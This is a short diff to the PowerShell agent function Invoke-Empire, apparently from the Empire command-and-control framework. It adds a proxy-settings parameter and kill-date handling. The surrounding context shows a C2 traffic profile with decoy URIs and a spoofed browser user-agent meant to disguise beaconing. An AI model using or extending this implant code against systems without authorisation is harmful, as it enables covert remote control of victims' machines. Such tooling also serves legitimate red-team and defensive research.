@@ -71,6 +71,9 @@ function Invoke-Empire {
         [String]
         $WorkingHours,
 
+        [object]
+        $ProxySettings,
+
         [String]
         $Profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
 
@@ -97,6 +100,7 @@ function Invoke-Empire {
     $script:ResultIDs = @{}
     $script:WorkingHours = $WorkingHours
     $script:DefaultResponse = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($DefaultResponse))
+    $Script:Proxy = $ProxySettings
 
     # the currently active server
     $Script:ServerIndex = 0
@@ -108,6 +112,10 @@ function Invoke-Empire {
     # set a kill date of $KillDays out if specified
     if($KillDays) {
         $script:KillDate = (Get-Date).AddDays($KillDays).ToString('MM/dd/yyyy')
+    }
+
+    if($KillDate -ne "REPLACE_KILLDATE" -and $KillDate -ne $null) {
+        $script:KillDate = $KillDate
     }
 
     # get all the headers/etc. in line for our comms
